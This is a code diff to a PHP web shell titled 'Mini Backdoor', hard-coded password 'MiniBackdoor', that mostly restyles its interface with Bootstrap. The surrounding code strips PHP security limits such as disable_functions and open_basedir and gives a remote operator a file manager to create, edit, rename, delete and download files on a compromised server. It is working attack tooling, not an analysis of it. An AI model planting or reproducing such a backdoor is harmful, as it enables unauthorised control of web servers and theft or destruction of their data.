@@ -3,15 +3,15 @@ error_reporting(0);
 session_start();
 set_time_limit(0);
 ignore_user_abort(0);
-ini_set('max_execution_time', 0);
-ini_set('memory_limit', '999999999M');
-ini_set('zlib.output_compression', 'Off');
-ini_restore('safe_mode');
-ini_restore("safe_mode_include_dir");
-ini_restore("safe_mode_exec_dir");
-ini_restore("disable_functions");
-ini_restore("allow_url_fopen");
-ini_restore("open_basedir");
+@ini_set('max_execution_time', 0);
+@ini_set('memory_limit', '999999999M');
+@ini_set('zlib.output_compression', 'Off');
+@ini_restore('safe_mode');
+@ini_restore("safe_mode_include_dir");
+@ini_restore("safe_mode_exec_dir");
+@ini_restore("disable_functions");
+@ini_restore("allow_url_fopen");
+@ini_restore("open_basedir");
 $password = "MiniBackdoor";
 function home() {
 	$home = "http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."";
@@ -54,6 +54,10 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
   }
 }
 ?>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 <title>Mini Backdoor</title>
 <style type="text/css">
 	body {
@@ -74,13 +78,14 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
 		border-spacing:0;
 		border:1px solid green;
 	} th {
+		text-align:center;
 		padding:10px;
 		background:green
 	} input[type=text] {
 		color:#fff;
 		border:1px solid green;
 		background:transparent;
-	} input[type=submit], select {
+	} input[type=submit] {
 		font-weight:bold;
 		color:#fff;
 		border:1px solid green;
@@ -107,7 +112,7 @@ function cwd() {
 	return $cwd;
 }
 ?>
-<table align="center" width="100%">
+<table align="center" width="90%">
 	<tr>
 		<th colspan="3">MiniBackdoor</th>
 	</tr>
@@ -485,10 +490,10 @@ if ($_POST['do'] == 'edit') {
 	<center>
 		Filename : <?php print $_POST['file'] ?><br>
 	<form method="post">
-		<textarea name="text"><?php print $text ?></textarea>
+		<textarea style="width:90%;" class="form-control" id="exampleFormControlTextarea1" rows="3" name="text"><?php print $text ?></textarea>
 		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
-		<input type="hidden" name="do" value="edit"><br><br>
-		<input style="width:100%;" type="submit" value="SAVE">
+		<input type="hidden" name="do" value="edit"><br>
+		<input class="btn btn-success" style="width:90%;" type="submit" value="SAVE">
 	</form>
     </center>
 	<?php
@@ -504,11 +509,18 @@ if ($_POST['do'] == 'edit') {
 	<br>
 	<center>
 	<form method="post">
-		Filename : 
-		<input style="width:250px;" type="text" name="rename" value="<?php print $_POST['file'] ?>">
-		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
-		<input type="hidden" name="do" value="rename">
-		<input type="submit">
+		<table width="90%" style="border:none;">
+		<tr style="border:none;">
+		<td style="border:none;">
+<div class="input-group mb-3">
+  <div class="input-group-prepend">
+    <input class="btn btn-outline-secondary" type="submit">
+  </div>
+  <input type="text" class="form-control" placeholder="" aria-label="" aria-describedby="basic-addon1" name="rename" value="<?php print $_POST['file'] ?>">
+  <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+  <input type="hidden" name="do" value="rename">
+</td>
+</div>
 	</form>
     </center>
 	<?php
@@ -547,18 +559,25 @@ if (isset($_GET['dir'])) {
 if (@$_POST['do'] == 'makefile') {
 	if (isset($_POST['make'])) {
 		if (@touch(@cwd().SEP.@htmlspecialchars($_POST['make']))) {
-			print("Success");
+			@alertSuccess("Success :)");
 		} else {
-			print("Failed");
+			@alertFailed("Failed :(");
 		}
 	}
 	?>
 	<center><br>
 	<form method="post">
-		Filename : 
-		<input style="width:250px;" type="text" name="make" value="newfile.php">
+		<table width="90%" style="border:none;">
+			<tr style="border:none;">
+				<td style="border:none;">
+		<div class="input-group mb-3">
+          <div class="input-group-prepend">
+        <input class="btn btn-outline-secondary" type="submit">
+        </div>
+        <input style="width:90%;" type="text" class="form-control" name="make" value="newfile.php">
 		<input type="hidden" name="do" value="makefile">
-		<input type="submit">
+	</td>
+	</div>
 	</form>
     </center>
 	<?php
@@ -566,24 +585,31 @@ if (@$_POST['do'] == 'makefile') {
 if (@$_POST['do'] == 'makedir') {
 	if (isset($_POST['make'])) {
 		if (@mkdir(@cwd().SEP.@htmlspecialchars($_POST['make']))) {
-			print("Success");
+			@alertSuccess("Success :)");
 		} else {
-			print("Failed");
+			@alertFailed("Delete Failed :(");
 		}
 	}
 	?>
 	<center><br>
 	<form method="post">
-		Dirname : 
-		<input style="width:250px;" type="text" name="make" value="newdir">
+		<table width="90%" style="border:none;">
+		<tr style="border:none;">
+		<td style="border:none;">
+		<div class="input-group mb-3">
+			<div class="input-group-prepend">
+				<input type="submit" class="btn btn-outline-secondary">
+			</div>
+		<input type="text" class="form-control" placeholder="" aria-label="" aria-describedby="basic-addon1" name="make" value="newdir">
 		<input type="hidden" name="do" value="makedir">
-		<input type="submit">
+		</td>
+		</div>
 	</form>
     </center>
 	<?php
 }
 ?>
-<table width="100%">
+<table width="90%" align="center">
 		</th>
 	</tr>
 	<tr>
@@ -599,25 +625,31 @@ foreach (@scandir(@cwd()) as $dir) {
 		$action = '
 		<center>
 			<form method="post" action="?dir='.@cwd().'">
-				<select name="do">
+			        <div class="input-group mb-3">
+                    <div class="input-group-prepend">
+                    <input type="submit" class="btn btn-outline-secondary" value="Action">
+                    </div>
+				<select name="do" class="custom-select" id="inputGroupSelect03" style="width:100px;">
 					<option value="makefile">Newfile</option>
 					<option value="makedir">Newdir</option>
 				</select>
-				<input type="submit" value="Action">
 			</form>
 		</center>';
 	} else {
 		$action = '
 		<center>
-			<form method="post" action="?dir='.@cwd().'">
-				<select name="do">
-					<option value="rename">Rename</option>
-					<option value="delete">Delete</option>
-				</select>
-				<input type="hidden" name="type" value="dir">
-				<input type="hidden" name="file" value="'.@cwd().SEP.$dir.'">
-				<input type="submit" value="Action">
-			</form>
+		    <form method="post" action="?dir='.@cwd().'">
+               <div class="input-group mb-3">
+               <div class="input-group-prepend">
+               <input type="submit" class="btn btn-outline-secondary" value="Action">
+               </div>
+            <select class="custom-select" id="inputGroupSelect03" name="do" style="width:100px;">
+	           <option value="rename">Rename</option>
+	           <option value="delete">Delete</option>
+            </select>
+            <input type="hidden" name="type" value="dir">
+            <input type="hidden" name="file" value="'.@cwd().SEP.$dir.'">
+            </div></form>
 		</center>';
 	}
 	?>
@@ -634,7 +666,7 @@ foreach (@scandir(@cwd()) as $dir) {
 			<?php print @writable($dir, @perms($dir)) ?>
 		</center>
 	</td>
-	<td>
+	<td style="width:200px;">
 		<?php print $action ?>
 	</td>
 	<?php
@@ -655,19 +687,22 @@ foreach (@scandir(@cwd()) as $file) {
 			<?php print @writable($file, @perms($file)) ?>
 		</center>
 	</td>
-	<td>
+	<td style="width:200px;">
 		<center>
-	<form method="post" action="?dir=<?php print @cwd() ?>">
-		<select name="do">
-			<option value="edit">Edit</option>
-			<option value="rename">Rename</option>
-			<option value="delete">Delete</option>
-			<option value="download">Download</option>
-		</select>
-		<input type="hidden" name="type" value="file">
-		<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
-		<input type="submit" value="Action">
-	</form></center></td>
+<form method="post" action="?dir=<?php print @cwd() ?>">
+<div class="input-group mb-3">
+  <div class="input-group-prepend">
+    <input type="submit" class="btn btn-outline-secondary" value="Action">
+  </div>
+  <select class="custom-select" id="inputGroupSelect03" name="do" style="width:100px;">
+    <option value="edit">Edit</option>
+	<option value="rename">Rename</option>
+	<option value="delete">Delete</option>
+	<option value="download">Download</option>
+  </select>
+  <input type="hidden" name="type" value="file">
+  <input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
+</div></form></td>
 	<?php
 }
 ?>
